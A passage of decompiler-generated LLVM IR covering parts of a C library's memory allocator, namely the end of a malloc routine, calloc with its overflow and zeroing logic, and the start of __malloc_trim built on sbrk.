dec_label_pc_805fa3d:                             ; preds = %dec_label_pc_805f9ef, %dec_label_pc_805f9d4, %dec_label_pc_805f9cf, %dec_label_pc_805f8fe, %dec_label_pc_805fa16
  %v0_805fa3d = load i32, i32* @global_var_807e988.745, align 8
  store i32 %v0_805fa3d, i32* %eax.global-to-local, align 4
  %v1_805fa42 = load i32, i32* @global_var_807e98c.750, align 4
  %tmp138 = icmp ugt i32 %v0_805fa3d, %v1_805fa42
  br i1 %tmp138, label %dec_label_pc_805fa4a, label %dec_label_pc_805fa4f

dec_label_pc_805fa4a:                             ; preds = %dec_label_pc_805fa3d
  store i32 %v0_805fa3d, i32* @global_var_807e98c.750, align 4
  br label %dec_label_pc_805fa4f

dec_label_pc_805fa4f:                             ; preds = %dec_label_pc_805fa3d, %dec_label_pc_805fa4a
  %v1_805fa4f = load i32, i32* @global_var_807e984.743, align 4
  %v2_805fa4f = add i32 %v1_805fa4f, %v0_805fa3d
  store i32 %v2_805fa4f, i32* %eax.global-to-local, align 4
  %v1_805fa55 = load i32, i32* @global_var_807e994.746, align 4
  %tmp139 = icmp ugt i32 %v2_805fa4f, %v1_805fa55
  br i1 %tmp139, label %dec_label_pc_805fa5d, label %dec_label_pc_805fa62

dec_label_pc_805fa5d:                             ; preds = %dec_label_pc_805fa4f
  store i32 %v2_805fa4f, i32* @global_var_807e994.746, align 4
  br label %dec_label_pc_805fa62

dec_label_pc_805fa62:                             ; preds = %dec_label_pc_805fa4f, %dec_label_pc_805fa5d
  %v0_805fa62 = load i32, i32* @global_var_807e64c.733, align 4
  store i32 %v0_805fa62, i32* @ebx, align 4
  %v1_805fa68 = add i32 %v0_805fa62, 4
  %v2_805fa68 = inttoptr i32 %v1_805fa68 to i32*
  %v3_805fa68 = load i32, i32* %v2_805fa68, align 4
  %v1_805fa6b = and i32 %v3_805fa68, -4
  store i32 %v1_805fa6b, i32* @ecx, align 4
  %v10_805fa6e = icmp ult i32 %v1_805fa6b, %v1_805f70b
  br i1 %v10_805fa6e, label %dec_label_pc_805faee, label %dec_label_pc_805fa74

dec_label_pc_805fa74:                             ; preds = %dec_label_pc_805fa62
  store i32 %v1_805f796, i32* %esi.global-to-local, align 4
  %v2_805fa7a = sub i32 %v1_805fa6b, %v1_805f796
  store i32 %v2_805fa7a, i32* %ecx.global-to-local, align 4
  %v2_805fa7c = add i32 %v0_805fa62, %v1_805f796
  store i32 %v2_805fa7c, i32* %edx.global-to-local, align 4
  %v1_805fa7f = or i32 %v1_805f796, 1
  store i32 %v1_805fa7f, i32* %eax.global-to-local, align 4
  store i32 %v2_805fa7c, i32* @global_var_807e64c.733, align 4
  store i32 %v1_805fa7f, i32* %v2_805fa68, align 4
  %v0_805fa8b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805fa8b

dec_label_pc_805fa8b:                             ; preds = %dec_label_pc_805f71c, %dec_label_pc_805fa74
  %v0_805fa8b = phi i32 [ %v5_805f72f, %dec_label_pc_805f71c ], [ %v0_805fa8b.pre, %dec_label_pc_805fa74 ]
  %v1_805fa8b = or i32 %v0_805fa8b, 1
  store i32 %v1_805fa8b, i32* @ecx, align 4
  %v0_805fa8e = load i32, i32* @ebx, align 4
  %v1_805fa8e = add i32 %v0_805fa8e, 8
  store i32 %v1_805fa8e, i32* @ebx, align 4
  %v1_805fa91 = load i32, i32* %edx.global-to-local, align 4
  %v2_805fa91 = add i32 %v1_805fa91, 4
  %v3_805fa91 = inttoptr i32 %v2_805fa91 to i32*
  store i32 %v1_805fa8b, i32* %v3_805fa91, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805fa96:                             ; preds = %dec_label_pc_805f4d6
  %v5_805fa9c = sub i32 %v1_805f4b9, %v1_805f796
  store i32 %v5_805fa9c, i32* %eax.global-to-local, align 4
  %v2_805faa0 = add i32 %v0_805f584113, %v1_805f796
  store i32 %v2_805faa0, i32* %edx.global-to-local, align 4
  %v1_805faa4 = or i32 %v1_805f796, 1
  store i32 %v2_805faa0, i32* @global_var_807e650.734, align 16
  store i32 %v1_805faa4, i32* %v2_805f4b3, align 4
  %v0_805fab0 = load i32, i32* %eax.global-to-local, align 4
  %v0_805fab2 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805fab2, i32* @global_var_807e65c.751, align 4
  %v1_805fab8 = or i32 %v0_805fab0, 1
  store i32 %v1_805fab8, i32* @ecx, align 4
  store i32 %v0_805fab2, i32* @global_var_807e660.736, align 32
  %v1_805fac1 = add i32 %v0_805fab2, 8
  %v2_805fac1 = inttoptr i32 %v1_805fac1 to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805fac1, align 4
  %v0_805fac8 = load i32, i32* %edx.global-to-local, align 4
  %v1_805fac8 = add i32 %v0_805fac8, 12
  %v2_805fac8 = inttoptr i32 %v1_805fac8 to i32*
  store i32 ptrtoint (i32* @global_var_807e654.735 to i32), i32* %v2_805fac8, align 4
  %v0_805facf = load i32, i32* @ecx, align 4
  %v1_805facf = load i32, i32* %edx.global-to-local, align 4
  %v2_805facf = add i32 %v1_805facf, 4
  %v3_805facf = inttoptr i32 %v2_805facf to i32*
  store i32 %v0_805facf, i32* %v3_805facf, align 4
  %v0_805fad2 = load i32, i32* %eax.global-to-local, align 4
  %v1_805fad2 = load i32, i32* %edx.global-to-local, align 4
  %v3_805fad2 = add i32 %v1_805fad2, %v0_805fad2
  %v4_805fad2 = inttoptr i32 %v3_805fad2 to i32*
  store i32 %v0_805fad2, i32* %v4_805fad2, align 4
  br label %dec_label_pc_805fae0

dec_label_pc_805fad7:                             ; preds = %dec_label_pc_805f4e5
  store i32 %v1_805f796, i32* %ebx.global-to-local, align 4
  %v0_805fadb = load i32, i32* @ebp, align 4
  %v2_805fadb = or i32 %v1_805f796, 4
  %v3_805fadb = add i32 %v0_805fadb, %v2_805fadb
  %v4_805fadb = inttoptr i32 %v3_805fadb to i32*
  %v5_805fadb = load i32, i32* %v4_805fadb, align 4
  %v6_805fadb = or i32 %v5_805fadb, 1
  store i32 %v6_805fadb, i32* %v4_805fadb, align 4
  br label %dec_label_pc_805fae0

dec_label_pc_805fae0:                             ; preds = %dec_label_pc_805fa96, %dec_label_pc_805fad7
  %v0_805fae0 = load i32, i32* @ebp, align 4
  %v1_805fae0 = add i32 %v0_805fae0, 8
  store i32 %v1_805fae0, i32* @ebx, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805fae5:                             ; preds = %dec_label_pc_805f5d5
  %v1_805fae5 = load i32, i32* @ebx, align 4
  %v2_805fae5 = add i32 %v0_805f5e4, 4
  %v3_805fae5 = add i32 %v2_805fae5, %v1_805fae5
  %v4_805fae5 = inttoptr i32 %v3_805fae5 to i32*
  %v5_805fae5 = load i32, i32* %v4_805fae5, align 4
  %v6_805fae5 = or i32 %v5_805fae5, 1
  store i32 %v6_805fae5, i32* %v4_805fae5, align 4
  br label %dec_label_pc_805faea

dec_label_pc_805faea:                             ; preds = %dec_label_pc_805f5ed, %dec_label_pc_805fae5
  %v0_805faea = load i32, i32* @ecx, align 4
  store i32 %v0_805faea, i32* @ebx, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805faee:                             ; preds = %dec_label_pc_805f8ac, %dec_label_pc_805fa62, %dec_label_pc_805f8e0, %dec_label_pc_805f8b6
  %v0_805faee = load i32, i32* %stack_var_-92, align 4
  %v1_805faee = call i32 @__errno_location(i32 %v0_805faee)
  store i32 %v1_805faee, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805faf5 = inttoptr i32 %v1_805faee to i32*
  store i32 12, i32* %v1_805faf5, align 4
  br label %dec_label_pc_805fafb

dec_label_pc_805fafb:                             ; preds = %dec_label_pc_805faea, %dec_label_pc_805fae0, %dec_label_pc_805fa8b, %dec_label_pc_805f747, %dec_label_pc_805f6f9, %dec_label_pc_805f480, %dec_label_pc_805faee
  store i32 %v2_805f3b7, i32* %eax.global-to-local, align 4
  store i32 %v2_805f3b7, i32* %stack_var_-92, align 4
  %v3_805fb04 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_805fb04, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fb0c

dec_label_pc_805fb0c:                             ; preds = %dec_label_pc_805f3d5, %dec_label_pc_805fafb
  %v0_805fb0f = load i32, i32* @ebx, align 4
  store i32 %v0_805fb0f, i32* %eax.global-to-local, align 4
  %v2_805fb11 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805fb11, i32* @ebx, align 4
  store i32 %v0_805f3a4, i32* @esi, align 4
  store i32 %v0_805f3a3, i32* @edi, align 4
  store i32 %v0_805f3a2, i32* @ebp, align 4
  ret i32 %v0_805fb0f

; uselistorder directives
  uselistorder i32 %v0_805fad2, { 1, 0 }
  uselistorder i32 %v0_805fab2, { 1, 0, 2 }
  uselistorder i32 %v2_805fa4f, { 1, 0, 2 }
  uselistorder i32 %v0_805fa3d, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805f9d4, { 1, 0 }
  uselistorder i32 %v2_805f9c2, { 1, 0 }
  uselistorder i32 %v1_805f979, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805f963, { 1, 0, 2 }
  uselistorder i32 %v2_805f957, { 1, 2, 0 }
  uselistorder i32 %v2_805f952, { 1, 0, 2 }
  uselistorder i32 %v1_805f942, { 2, 1, 0 }
  uselistorder i8 %v0_805f910, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805f8f3, { 1, 0, 2 }
  uselistorder i32 %v0_805f9b5, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_805f9a7, { 2, 0, 1 }
  uselistorder i32 %v8_805f8c3, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805f8c0, { 1, 0 }
  uselistorder i32 %v0_805f89f, { 1, 0 }
  uselistorder i32 %v1_805f878, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805f870, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805f868, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_805f855, { 1, 0 }
  uselistorder i32 %v1_805f84c, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_805f839, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_805f81d, { 1, 0, 2 }
  uselistorder i32 %v2_805f809, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_805f7d2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805f7c6, { 2, 1, 0 }
  uselistorder i32 %v8_805f7b5, { 4, 2, 1, 0, 3, 5 }
  uselistorder i32 %v2_805f79c, { 1, 0, 2 }
  uselistorder i32 %v0_805f738, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805f70b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805f701, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_805f6f3, { 1, 0 }
  uselistorder i32 %v1_805f68a, { 1, 0 }
  uselistorder i32 %v3_805f67e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_805f68e, { 1, 0 }
  uselistorder i32 %v2_805f678, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_805f67512, { 1, 0 }
  uselistorder i32 %v2_805f66a, { 1, 0 }
  uselistorder i32 %v1_805f64e, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_805f64a, { 2, 1, 0 }
  uselistorder i32 %v1_805f646, { 1, 0 }
  uselistorder i32 %v1_805f63a, { 2, 1, 0 }
  uselistorder i32 %v2_805f630, { 1, 0 }
  uselistorder i32 %v1_805f62d, { 1, 2, 0 }
  uselistorder i32 %v4_805f5cb, { 0, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 %v0_805f616, { 1, 0 }
  uselistorder i32 %v0_805f5e4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805f5b7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805f584, { 1, 2, 0 }
  uselistorder i32 %v2_805f568, { 1, 0 }
  uselistorder i32 %v1_805f55e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_805f559.lcssa, { 1, 0 }
  uselistorder i32 %v3_805f549, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_805f540, { 1, 0, 2 }
  uselistorder i32 %v3_805f523, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_805f51c, { 1, 0, 2 }
  uselistorder i32 %v2_805f504, { 2, 1, 0 }
  uselistorder i32 %v0_805f4f0, { 2, 1, 3, 0 }
  uselistorder i32 %v3_805f4b6, { 1, 0, 2 }
  uselistorder i32 %v0_805f584113, { 1, 0, 2, 3 }
  uselistorder i32 %v3_805f463, { 1, 0, 2 }
  uselistorder i32 %v2_805f455, { 2, 1, 0 }
  uselistorder i32 %v2_805f430, { 2, 1, 0 }
  uselistorder i8 %v0_805f3fe, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_805f796, { 13, 31, 11, 5, 29, 12, 6, 22, 21, 2, 1, 7, 24, 23, 20, 18, 19, 8, 25, 26, 9, 27, 28, 15, 10, 16, 17, 0, 30, 14, 3, 32, 34, 33, 4, 35 }
  uselistorder i32 %v1_805f3e7, { 0, 2, 1 }
  uselistorder i32 %v0_805f3d0, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 22, 21, 23, 24, 28, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 7, 4, 1, 5, 6, 8, 9, 10, 11, 0, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 56, 51, 52, 55, 54, 53, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_807e980.748, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0, 4, 3, 2 }
  uselistorder i32 134735444, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_807e660.736, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_807e64c.733 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_807e64c.733 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805fb0c, { 1, 0 }
  uselistorder label %dec_label_pc_805fafb, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_805faee, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805faea, { 1, 0 }
  uselistorder label %dec_label_pc_805fae0, { 1, 0 }
  uselistorder label %dec_label_pc_805fa8b, { 1, 0 }
  uselistorder label %dec_label_pc_805fa62, { 1, 0 }
  uselistorder label %dec_label_pc_805fa4f, { 1, 0 }
  uselistorder label %dec_label_pc_805fa3d, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805f9cf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f9ca, { 1, 0 }
  uselistorder label %dec_label_pc_805f9ae, { 1, 0 }
  uselistorder label %dec_label_pc_805f957, { 1, 0 }
  uselistorder label %dec_label_pc_805f940, { 1, 0 }
  uselistorder label %dec_label_pc_805f929, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805f8e0, { 1, 0 }
  uselistorder label %dec_label_pc_805f8ac, { 1, 0 }
  uselistorder label %dec_label_pc_805f89f, { 1, 0 }
  uselistorder label %dec_label_pc_805f860, { 1, 0 }
  uselistorder label %dec_label_pc_805f839, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805f81d, { 1, 0 }
  uselistorder label %dec_label_pc_805f804, { 1, 0 }
  uselistorder label %dec_label_pc_805f7e6, { 1, 0 }
  uselistorder label %dec_label_pc_805f701, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805f6f9, { 1, 0 }
  uselistorder label %dec_label_pc_805f6e2, { 1, 0 }
  uselistorder label %dec_label_pc_805f675, { 1, 0 }
  uselistorder label %dec_label_pc_805f67a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805f64e, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f5d5, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_805f55c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805f545, { 1, 0 }
  uselistorder label %dec_label_pc_805f4b3, { 1, 0 }
  uselistorder label %dec_label_pc_805f584.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805f480, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805f3fe, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805fb18 = load i32, i32* @edi, align 4
  %v0_805fb1a = load i32, i32* @ebx, align 4
  %v12_805fb1b = ptrtoint i32* %stack_var_-28 to i32
  %v4_805fb1e = trunc i64 %arg1 to i32
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_805fb28 = sdiv i64 %sext, 4294967296
  %v3_805fb28 = sext i32 %arg2 to i64
  %v4_805fb28 = mul nsw i64 %v3_805fb28, %v2_805fb28
  %v5_805fb28 = trunc i64 %v4_805fb28 to i32
  store i32 %v5_805fb28, i32* @ebx, align 4
  %v2_805fb2b = icmp eq i32 %v4_805fb1e, 0
  br i1 %v2_805fb2b, label %dec_label_pc_805fb4d, label %dec_label_pc_805fb2f

dec_label_pc_805fb2f:                             ; preds = %entry
  store i32 %v4_805fb1e, i32* @edi, align 4
  %div = udiv i32 %v5_805fb28, %v4_805fb1e
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_805fb37 = icmp eq i32 %div, %arg2
  br i1 %v12_805fb37, label %dec_label_pc_805fb4d, label %dec_label_pc_805fb3b

dec_label_pc_805fb3b:                             ; preds = %dec_label_pc_805fb2f
  %v1_805fb3b = call i32 @__errno_location(i32 %v0_805fb1a)
  store i32 %v1_805fb3b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805fb42 = inttoptr i32 %v1_805fb3b to i32*
  store i32 12, i32* %v1_805fb42, align 4
  br label %dec_label_pc_805fc03

dec_label_pc_805fb4d:                             ; preds = %dec_label_pc_805fb2f, %entry
  store i32 %v12_805fb1b, i32* %eax.global-to-local, align 4
  %v4_805fb5d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134585853, i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v4_805fb5d, i32* %eax.global-to-local, align 4
  %v1_805fb69 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074750.648 to i32))
  store i32 %v1_805fb69, i32* %eax.global-to-local, align 4
  %v0_805fb6e = load i32, i32* @ebx, align 4
  %v1_805fb71 = call i32 @malloc(i32 %v0_805fb6e)
  store i32 %v1_805fb71, i32* %eax.global-to-local, align 4
  store i32 %v1_805fb71, i32* @ebx, align 4
  %v1_805fb7b = icmp eq i32 %v1_805fb71, 0
  br i1 %v1_805fb7b, label %dec_label_pc_805fbf2, label %dec_label_pc_805fb7f

dec_label_pc_805fb7f:                             ; preds = %dec_label_pc_805fb4d
  %v1_805fb7f = add i32 %v1_805fb71, -4
  %v2_805fb7f = inttoptr i32 %v1_805fb7f to i32*
  %v3_805fb7f = load i32, i32* %v2_805fb7f, align 4
  store i32 %v3_805fb7f, i32* %eax.global-to-local, align 4
  %v2_805fb82 = and i32 %v3_805fb7f, 2
  %v3_805fb82 = icmp eq i32 %v2_805fb82, 0
  %v1_805fb84 = icmp eq i1 %v3_805fb82, false
  br i1 %v1_805fb84, label %dec_label_pc_805fbf2, label %dec_label_pc_805fb86

dec_label_pc_805fb86:                             ; preds = %dec_label_pc_805fb7f
  %v1_805fb863 = add i32 %v3_805fb7f, -4
  %v1_805fb89 = and i32 %v1_805fb863, -4
  %v2_805fb8e = udiv i32 %v1_805fb89, 4
  store i32 %v2_805fb8e, i32* %eax.global-to-local, align 4
  %v5_805fb91 = icmp ult i32 %v1_805fb89, 36
  %tmp = and i32 %v1_805fb863, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_805fb94 = or i1 %v5_805fb91, %tmp18
  br i1 %v2_805fb94, label %dec_label_pc_805fba5, label %dec_label_pc_805fb96

dec_label_pc_805fb96:                             ; preds = %dec_label_pc_805fb86
  %v3_805fb9b = inttoptr i32 %v1_805fb71 to i8*
  %v4_805fb9b = call i32 @__GI_memset(i8* %v3_805fb9b, i32 0, i32 %v1_805fb89)
  store i32 %v4_805fb9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fbf2

dec_label_pc_805fba5:                             ; preds = %dec_label_pc_805fb86
  %v1_805fba5 = inttoptr i32 %v1_805fb71 to i32*
  store i32 0, i32* %v1_805fba5, align 4
  %v0_805fbab = load i32, i32* @ebx, align 4
  %v1_805fbab = add i32 %v0_805fbab, 4
  %v2_805fbab = inttoptr i32 %v1_805fbab to i32*
  store i32 0, i32* %v2_805fbab, align 4
  %v0_805fbb2 = load i32, i32* @ebx, align 4
  %v1_805fbb2 = add i32 %v0_805fbb2, 8
  %v2_805fbb2 = inttoptr i32 %v1_805fbb2 to i32*
  store i32 0, i32* %v2_805fbb2, align 4
  %v0_805fbb9 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_805fbb9, 5
  br i1 %tmp15, label %dec_label_pc_805fbf2, label %dec_label_pc_805fbbe

dec_label_pc_805fbbe:                             ; preds = %dec_label_pc_805fba5
  %v0_805fbbe = load i32, i32* @ebx, align 4
  %v1_805fbbe = add i32 %v0_805fbbe, 12
  %v2_805fbbe = inttoptr i32 %v1_805fbbe to i32*
  store i32 0, i32* %v2_805fbbe, align 4
  %v0_805fbc5 = load i32, i32* @ebx, align 4
  %v1_805fbc5 = add i32 %v0_805fbc5, 16
  %v2_805fbc5 = inttoptr i32 %v1_805fbc5 to i32*
  store i32 0, i32* %v2_805fbc5, align 4
  %v0_805fbcc = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_805fbcc, 7
  br i1 %tmp16, label %dec_label_pc_805fbf2, label %dec_label_pc_805fbd1

dec_label_pc_805fbd1:                             ; preds = %dec_label_pc_805fbbe
  %v0_805fbd1 = load i32, i32* @ebx, align 4
  %v1_805fbd1 = add i32 %v0_805fbd1, 20
  %v2_805fbd1 = inttoptr i32 %v1_805fbd1 to i32*
  store i32 0, i32* %v2_805fbd1, align 4
  %v0_805fbd8 = load i32, i32* @ebx, align 4
  %v1_805fbd8 = add i32 %v0_805fbd8, 24
  %v2_805fbd8 = inttoptr i32 %v1_805fbd8 to i32*
  store i32 0, i32* %v2_805fbd8, align 4
  %v0_805fbdf = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_805fbdf, 9
  br i1 %tmp17, label %dec_label_pc_805fbf2, label %dec_label_pc_805fbe4

dec_label_pc_805fbe4:                             ; preds = %dec_label_pc_805fbd1
  %v0_805fbe4 = load i32, i32* @ebx, align 4
  %v1_805fbe4 = add i32 %v0_805fbe4, 28
  %v2_805fbe4 = inttoptr i32 %v1_805fbe4 to i32*
  store i32 0, i32* %v2_805fbe4, align 4
  %v0_805fbeb = load i32, i32* @ebx, align 4
  %v1_805fbeb = add i32 %v0_805fbeb, 32
  %v2_805fbeb = inttoptr i32 %v1_805fbeb to i32*
  store i32 0, i32* %v2_805fbeb, align 4
  br label %dec_label_pc_805fbf2

dec_label_pc_805fbf2:                             ; preds = %dec_label_pc_805fbd1, %dec_label_pc_805fbbe, %dec_label_pc_805fba5, %dec_label_pc_805fb7f, %dec_label_pc_805fb4d, %dec_label_pc_805fb96, %dec_label_pc_805fbe4
  store i32 %v12_805fb1b, i32* %eax.global-to-local, align 4
  %v3_805fbfb = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_805fbfb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805fc03

dec_label_pc_805fc03:                             ; preds = %dec_label_pc_805fb3b, %dec_label_pc_805fbf2
  %v0_805fc06 = load i32, i32* @ebx, align 4
  store i32 %v0_805fc06, i32* %eax.global-to-local, align 4
  store i32 %v0_805fb1a, i32* @ebx, align 4
  store i32 %v0_805fb18, i32* @edi, align 4
  ret i32 %v0_805fc06

; uselistorder directives
  uselistorder i32 %v1_805fb89, { 2, 1, 0 }
  uselistorder i32 %v1_805fb71, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 7, 8, 9, 10, 11, 12, 14, 13 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805fc03, { 1, 0 }
  uselistorder label %dec_label_pc_805fbf2, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805fc0f = load i32, i32* @ebx, align 4
  %v0_805fc13 = load i32, i32* @edx, align 4
  store i32 %v0_805fc13, i32* %ebp.global-to-local, align 4
  %v1_805fc15 = add i32 %v0_805fc13, 860
  %v2_805fc15 = inttoptr i32 %v1_805fc15 to i32*
  %v3_805fc15 = load i32, i32* %v2_805fc15, align 4
  store i32 %v3_805fc15, i32* @ecx, align 4
  %v1_805fc1b = add i32 %v0_805fc13, 44
  %v2_805fc1b = inttoptr i32 %v1_805fc1b to i32*
  %v3_805fc1b = load i32, i32* %v2_805fc1b, align 4
  %v1_805fc1e = add i32 %v3_805fc1b, 4
  %v2_805fc1e = inttoptr i32 %v1_805fc1e to i32*
  %v3_805fc1e = load i32, i32* %v2_805fc1e, align 4
  %v1_805fc21 = and i32 %v3_805fc1e, -4
  store i32 %v1_805fc21, i32* @esi, align 4
  %v1_805fc26 = load i32, i32* @eax, align 4
  %v2_805fc26 = add i32 %v3_805fc15, -17
  %v2_805fc28 = add i32 %v2_805fc26, %v1_805fc21
  %v3_805fc28 = sub i32 %v2_805fc28, %v1_805fc26
  %div = udiv i32 %v3_805fc28, %v3_805fc15
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_805fc30 = add i32 %div, -1
  %v4_805fc33 = mul i32 %v1_805fc30, %v3_805fc15
  store i32 %v4_805fc33, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805fc33, 1
  br i1 %tmp11, label %dec_label_pc_805fc8f, label %dec_label_pc_805fc3a

dec_label_pc_805fc3a:                             ; preds = %entry
  %v1_805fc3f = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805fc3f, i32* %edi.global-to-local, align 4
  %v0_805fc46 = load i32, i32* @esi, align 4
  store i32 %v0_805fc46, i32* %eax.global-to-local, align 4
  %v1_805fc48 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805fc48 = add i32 %v1_805fc48, 44
  %v3_805fc48 = inttoptr i32 %v2_805fc48 to i32*
  %v4_805fc48 = load i32, i32* %v3_805fc48, align 4
  %v5_805fc48 = add i32 %v4_805fc48, %v0_805fc46
  store i32 %v5_805fc48, i32* %eax.global-to-local, align 4
  %v12_805fc4e = icmp eq i32 %v1_805fc3f, %v5_805fc48
  %v1_805fc50 = icmp eq i1 %v12_805fc4e, false
  br i1 %v1_805fc50, label %dec_label_pc_805fc8f, label %dec_label_pc_805fc52

dec_label_pc_805fc52:                             ; preds = %dec_label_pc_805fc3a
  %v1_805fc55 = sub i32 0, %v4_805fc33
  store i32 %v1_805fc55, i32* @ebx, align 4
  %v1_805fc58 = call i32 @__GI_sbrk(i32 %v1_805fc55)
  store i32 %v1_805fc58, i32* %eax.global-to-local, align 4
  %v1_805fc64 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805fc64, i32* %eax.global-to-local, align 4
  %v10_805fc6c = icmp eq i32 %v1_805fc64, -1
  br i1 %v10_805fc6c, label %dec_label_pc_805fc8f, label %dec_label_pc_805fc71

dec_label_pc_805fc71:                             ; preds = %dec_label_pc_805fc52
  %v0_805fc71 = load i32, i32* %edi.global-to-local, align 4
  %v2_805fc73 = sub i32 %v0_805fc71, %v1_805fc64
  %v12_805fc73 = icmp eq i32 %v2_805fc73, 0
  store i32 %v2_805fc73, i32* @ecx, align 4
  br i1 %v12_805fc73, label %dec_label_pc_805fc8f, label %dec_label_pc_805fc77

